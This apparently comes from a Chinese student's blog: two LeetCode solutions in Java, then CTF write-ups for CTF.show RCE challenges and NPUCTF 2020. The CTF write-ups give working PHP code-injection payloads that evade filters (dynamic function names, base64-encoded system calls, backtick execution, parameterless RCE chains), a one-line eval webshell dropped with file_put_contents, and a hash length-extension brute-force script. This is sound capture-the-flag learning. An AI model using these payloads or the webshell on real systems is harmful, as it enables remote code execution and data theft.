<h3 id="2020-05-22"><a href="#2020-05-22" class="headerlink" title="2020.05.22"></a>2020.05.22</h3><h4 id="105-从前序与中序遍历序列构造二叉树"><a href="#105-从前序与中序遍历序列构造二叉树" class="headerlink" title="105. 从前序与中序遍历序列构造二叉树"></a><a class="link"   href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/" >105. 从前序与中序遍历序列构造二叉树<i class="fas fa-external-link-alt"></i></a></h4><p>根据一棵树的前序遍历与中序遍历构造二叉树。</p>
<p>注意:<br>你可以假设树中没有重复的元素。</p>
<p>例如，给出</p>
<p>前序遍历 preorder &#x3D; [3,9,20,15,7]<br>中序遍历 inorder &#x3D; [9,3,15,20,7]<br>返回如下的二叉树：</p>
<p>​	3</p>
<p>   &#x2F; <br>  9  20<br>    &#x2F;  <br>   15   7</p>
<hr>
<p>直接看题解好的吧！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">    前序遍历： 根  左   右</span></span><br><span class="line"><span class="comment">    中序遍历：  左  根  右</span></span><br><span class="line"><span class="comment">    那么，我们可以</span></span><br><span class="line"><span class="comment">    确定根， 确定左子树    确定右子树</span></span><br><span class="line"><span class="comment">    一直到最底部，返回空    返回根节点</span></span><br><span class="line"><span class="comment">    返回根节点  返回根节点  返回根节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer,Integer&gt; indexmap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="comment">//构造哈希映射</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> inorder.length;</span><br><span class="line">        <span class="comment">//确定 位于中序遍历的子树   有多少个节点</span></span><br><span class="line">        indexmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer,Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"></span><br><span class="line">            indexmap.put(inorder[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> liduoan_buildTree(preorder,inorder,<span class="number">0</span>,n-<span class="number">1</span>,<span class="number">0</span>,n-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">liduoan_buildTree</span><span class="params">(<span class="type">int</span>[] preorder,<span class="type">int</span>[] inorder,<span class="type">int</span> preleft,<span class="type">int</span> preright,<span class="type">int</span> inorder_left,<span class="type">int</span> inorder_right)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preleft&gt;preright)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//确定根节点位置——依靠前序遍历</span></span><br><span class="line">        <span class="comment">//在中序遍历中确定根节点位置</span></span><br><span class="line">        <span class="comment">//通过根节点确定左子树长度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">pre_root</span> <span class="operator">=</span> preleft;</span><br><span class="line">        <span class="type">int</span> <span class="variable">order_root</span> <span class="operator">=</span> indexmap.get(preorder[preleft]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//建立节点  关键地方</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[pre_root]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//确定左子树的长度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size_left_tree</span> <span class="operator">=</span> order_root - inorder_left;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//前序遍历左子树初始    左子树末尾  中序遍历左边    中序遍历左子树最后</span></span><br><span class="line">        root.left = liduoan_buildTree(preorder,inorder,preleft+<span class="number">1</span>,preleft+size_left_tree,inorder_left,order_root-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        root.right = liduoan_buildTree(preorder,inorder,preleft+size_left_tree+<span class="number">1</span>,preright,order_root+<span class="number">1</span>,inorder_right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-05-23"><a href="#2020-05-23" class="headerlink" title="2020.05.23"></a>2020.05.23</h3><h4 id="76-最小覆盖子串"><a href="#76-最小覆盖子串" class="headerlink" title="76. 最小覆盖子串"></a><a class="link"   href="https://leetcode-cn.com/problems/minimum-window-substring/" >76. 最小覆盖子串<i class="fas fa-external-link-alt"></i></a></h4><p>难度困难513</p>
<p>给你一个字符串 S、一个字符串 T，请在字符串 S 里面找出：包含 T 所有字符的最小子串。</p>
<p><strong>示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: S = &quot;ADOBECODEBANC&quot;, T = &quot;ABC&quot;</span><br><span class="line">输出: &quot;BANC&quot;</span><br></pre></td></tr></table></figure>

<hr>
<p>滑动窗口</p>
<p>维护一个窗口，不断滑动，然后更新答案。</p>
<p>算法的大致逻辑：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> left = <span class="number">0</span>; </span><br><span class="line"><span class="type">int</span> right = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(right&lt;s.<span class="built_in">size</span>())&#123;</span><br><span class="line"><span class="comment">//增大窗口</span></span><br><span class="line">windows.<span class="built_in">add</span>(s[right]);</span><br><span class="line">right++;</span><br><span class="line"></span><br><span class="line"><span class="comment">//缩小窗口</span></span><br><span class="line"><span class="keyword">while</span>(windows needs shrink)&#123;</span><br><span class="line">	windows.<span class="built_in">remove</span>(s[left]);</span><br><span class="line">	left++;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这道题目的算法逻辑：</p>
<p>1、我们在s中使用左右指针技巧，初始化left&#x3D;right&#x3D;0，把索引左闭右开区间称为一个窗口</p>
<p>2、不断增加right来扩大窗口，直到符合字符串</p>
<p>3、停止增加right，然后增加left来缩小窗口</p>
<p>4、重复2、3步，直到s的尽头</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">minWindow</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="comment">//首先定下窗口和t字符</span></span><br><span class="line">        HashMap&lt;Character,Integer&gt; needs = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Character,Integer&gt; windows = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置needs</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;t.length();i++)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> t.charAt(i);</span><br><span class="line">            needs.put(temp,needs.getOrDefault(temp,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义左右窗口节点和最值大小</span></span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,right=<span class="number">0</span>,minLen=Integer.MAX_VALUE;</span><br><span class="line">        <span class="comment">//定义count 确保满足条件窗口</span></span><br><span class="line">        <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//确定最后取值的范围</span></span><br><span class="line">        <span class="type">int</span> start=<span class="number">0</span>,end=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right&lt;s.length())&#123;</span><br><span class="line">            <span class="comment">//增加窗口</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> s.charAt(right);</span><br><span class="line">            <span class="keyword">if</span>(needs.containsKey(temp))&#123;</span><br><span class="line">                windows.put(temp,windows.getOrDefault(temp,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(windows.get(temp).compareTo(needs.get(temp))==<span class="number">0</span>)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//缩小窗口</span></span><br><span class="line">            <span class="keyword">while</span>(count==needs.size())&#123;</span><br><span class="line">                <span class="comment">//改变minlen</span></span><br><span class="line">                <span class="keyword">if</span>(right-left&lt;minLen)&#123;</span><br><span class="line">                    start = left;</span><br><span class="line">                    end = right;</span><br><span class="line">                    minLen = right-left;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//开始缩小窗口</span></span><br><span class="line">                <span class="type">char</span> <span class="variable">noneed</span> <span class="operator">=</span> s.charAt(left);</span><br><span class="line">                <span class="keyword">if</span>(needs.containsKey(noneed))&#123;</span><br><span class="line">                    windows.put(noneed,windows.get(noneed)-<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span>(windows.get(noneed).compareTo(needs.get(noneed))&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                        count--;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                left++;<span class="comment">//缩小一次</span></span><br><span class="line">                <span class="comment">//接着向左边移动</span></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minLen==Integer.MAX_VALUE? <span class="string">&quot;&quot;</span>:s.substring(start,end);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode——每日一题</category>
      </categories>
  </entry>
  <entry>
    <title>CTFTF_RCE专题</title>
    <url>/2020/04/14/%E5%9B%9B%E6%9C%88/CTFTF-RCE%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h2 id="2020-04-14"><a href="#2020-04-14" class="headerlink" title="2020.04.14"></a>2020.04.14</h2><p>今天写了写CTF.show的题目</p>
<p>遇到了一大堆的RCE的题目</p>
<p>有些操作没见到过。写一写</p>
<p>其实好多都可知利用无参RCE直接写出来的。先回顾一下读取的函数吧</p>
<p><code>file_get_contents()</code></p>
<p><code>print_r</code></p>
<p><code>highlight_file</code></p>
<p><code>echo</code></p>
<p>这些都尤其的经常使用</p>
<span id="more"></span>

<p>再说说几乎可以过大多数的RCE方法</p>
<p>无参RCE</p>
<p>下面是payload：</p>
<p><code>file_get_contents(next(array_reverse(scandir(pos(localeconv())))))</code></p>
<p><code>pos(localeconv())</code>:获得点’.’</p>
<p><code>scandir()</code>:获取当前目录有啥</p>
<p><code>array_reverse</code>:键值反转</p>
<p>再来说说这些题目：</p>
<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求使用里边三个函数来操作！</p>
<p>补充一下<code>exec</code>函数的知识</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408151301430.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很清晰 过滤了一些函数。但是没有过滤<code>file_get_contnts()</code>！</p>
<p>所以，payload:<code>print_r(file_get_contents(&#39;config.php&#39;));</code></p>
<p>第二种方法，使用动态调用 注意 这是绕过的一个好方法</p>
<p><code>?c=$a=&#39;sys&#39;;$b=&#39;tem&#39;;$d=$a.$b;$d(&#39;cat config.php&#39;);</code><br>flag需要右键查看源代码。</p>
<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>禁用了<code>cat</code> 还有好多的命令！</p>
<p>例如<code>echo</code>  或者 利用<code>ca&#39;&#39;t</code>过滤</p>
<p>这里是因为 再Linux命令中， <code>&#39;&#39;</code>可以绕过！</p>
<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>  这里是代码注入！不是命令执行！</p>
<p>所以我们的命令是可以进行编码绕过的！这很关键！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;   </span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$a = base64_decode(&#39;c3lzdGVt&#39;); </code>     这里编码system</p>
<p><code>$b=base64_decode(&#39;Y2F0IGNvbmZpZy5waHA=&#39;);</code>    这里编码命令 </p>
<p><code>$a($b);</code>     动态调用代码！</p>
<p>同时还有一种方法：</p>
<p>在Linux中反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。<br>比如 cat <code>ls</code> 相当于将 ls出来的结果cat</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">passthru</span>(<span class="string">&quot; ca&#x27;&#x27;t `ls`&quot;</span>);</span><br><span class="line">这里passthru  又是一个系统命令执行的函数！ 所以不是只有system啊！</span><br><span class="line">如果把分号过滤了</span><br><span class="line">c=<span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ca&#x27;&#x27;t `ls`&quot;</span>)<span class="meta">?&gt;</span></span><br><span class="line">c=<span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">base64_decode</span>(%<span class="number">27</span>c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%<span class="number">27</span>))<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>先看看代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意代码注入！</p>
<p>恶心的把小括号都过滤了！ 那咋办嘛</p>
<p>这又有一个新方法！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span> `<span class="variable">$_POST</span>[<span class="number">1</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后再post传入</p>
<p><code> 1=cat config.php</code></p>
<p>备注：</p>
<p>大都时候我们使用<code>system()</code>等函数执行系统命令，在一些的严格正则匹配情况下，过滤掉了大多数的命令执行函数，但是PHP有执行运算符，也就是反引号，和<code>shell_exec()</code> <code>system()</code>一样，可以执行系统命令。</p>
<p><a class="link"   href="https://www.php.net/manual/zh/language.operators.execution.php" >https://www.php.net/manual/zh/language.operators.execution.php<i class="fas fa-external-link-alt"></i></a></p>
<p>但是，反引号执行却没有任何回显</p>
<p>这也就是为什么前面需要用到<code>echo</code>函数！</p>
<h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>先看代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">            <span class="comment">//特殊符号  *？&lt;&gt; = ( . </span></span><br><span class="line">            <span class="comment">//函数  system exec highlight </span></span><br><span class="line">            <span class="comment">//命令  cat </span></span><br><span class="line">            <span class="comment">//名字  file php comnfig </span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1、编码绕过  因为过滤了(  所以大多数的函数都用不了</p>
<p>2、执行系统命令 反引号 echo 输出 echo没绕过</p>
<p>3、名字过滤 利用POST传参</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?c=echo%20`$_POST[2]`;</span>  <span class="string"></span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-bash">2=<span class="built_in">cat</span> `<span class="built_in">ls</span>`</span></span><br></pre></td></tr></table></figure>

<p>如果想直接输出目录下！ 请用上述的方法！</p>
<p>总结一下</p>
<p><strong>动态调用</strong></p>
<p><strong>无参RCE</strong> </p>
<p><strong>POST传参</strong></p>
<p><strong>反引号命令执行</strong></p>
<p><strong>shell里面’’无用</strong></p>
<p>今天就写到这吧</p>
<p>好迷茫啊。到底应该学什么！！！！</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF-WP</title>
    <url>/2020/04/24/%E5%9B%9B%E6%9C%88/NPUCTF-WP/</url>
    <content><![CDATA[<h2 id="NPUCTF-4-18-4-21"><a href="#NPUCTF-4-18-4-21" class="headerlink" title="NPUCTF   4.18-4.21"></a>NPUCTF   4.18-4.21</h2><p>很真实的运维赛，【滑稽</p>
<p>web题好难。好吧是我太菜啦</p>
<p>就写出来两道题目。。</p>
<span id="more"></span>

<h3 id="审查源码"><a href="#审查源码" class="headerlink" title="审查源码"></a>审查源码</h3><p>F5 鼠标右键不行</p>
<p>直接<code>view-source:url</code>就行了</p>
<p>甚至你还可以抓包来看。</p>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p>这道题目有点坑。不过也确实学到了东西</p>
<p>考点： 代码注入 反序列化  </p>
<p>查看源码知道</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/2020042417144223.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<p>那么我们打开看到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>很明显的反序列化执行。这里的构造函数<code>__construce()</code>在反序列化的时候是不会执行的，所以不必担心。</p>
<p>那么下面就是代码注入的环节了。我发现他禁掉了好多的函数。</p>
<p>最后测试出来使用 <code>assert</code>来进行代码注入。</p>
<p>先利用<code>assert(&quot;phpinfo();&quot;);</code>来看看被禁掉了哪些函数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/2020042417182371.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<p>确实 大多数的执行系统命令的函数都被过滤了。。</p>
<p>按照惯例，先看下目录。 这里不能使用系统命令。所以我们使用<code>scandir</code>函数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200424172024394.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<p>查看文件内容，除了系统命令，那就直接<code>file_get_contents()</code>来进行</p>
<p>结果查出来的是个假的flag。真的无聊。</p>
<p>然后我还翻遍大部分的文件。。</p>
<p>最后想着有没有可能在phpinfo中有。然后查询一下。。。果然</p>
<p>小tips：flag有可能会在phpinfo中，以后找到可以先查查看看。</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>看了天璇的wp</p>
<p>发现可以写马进去</p>
<p>具体利用方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents(&quot;eki.php&quot;, &quot;&lt;?php eval(\$_REQUEST[\&#x27;cmd\&#x27;]); ?&gt;&quot;)</span><br></pre></td></tr></table></figure>

<p>但是<code>eval</code>被禁止了呀。然而蚁剑的插件似乎可以绕过disabled_function</p>
<p><a class="link"   href="https://www.anquanke.com/post/id/195686?from=timeline" >https://www.anquanke.com/post/id/195686?from=timeline<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h3><p>这是一位师傅的wp</p>
<p>不太懂。。 我得去学学hash扩展攻击</p>
<hr>
<p>第一层又双叒叕是一个hash拓展攻击，没有长度就爆破一下</p>
<p>利用 <code>upload_progress</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=&#x27;http://ha1cyon-ctf.fun:30004/&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(40):</span><br><span class="line">    a,b=hashpumpy.hashpump(&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;,&#x27;123444&#x27;,&#x27;1&#x27;,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a))</span><br><span class="line">    if &#x27;username/password error&#x27; not in req.text:</span><br><span class="line">        print(req.text,url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>跳到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flflflflag.php</span><br></pre></td></tr></table></figure>

<p>可以文件包含</p>
<p>这里是用 <code>upload_progress</code>来写shell，然后包含</p>
<p><a href="https://camo.githubusercontent.com/34f390cee1c39d3264d04a01c02c64896fe97016/687474703a2f2f6d6f306e2e746f702f696d616765732f68613163796f6e2f7068702d75706c6f61642d70726f67726573732e706e67"><img  
                     lazyload
                     alt="image"
                     data-src="https://camo.githubusercontent.com/34f390cee1c39d3264d04a01c02c64896fe97016/687474703a2f2f6d6f306e2e746f702f696d616765732f68613163796f6e2f7068702d75706c6f61642d70726f67726573732e706e67"
                      alt="img"
                ></a></p>
<p>然后包含&#x2F;tmp&#x2F;m0on getshell，好像flag又是在phpinfo里面，根目录的是假的</p>
<p>flag:</p>
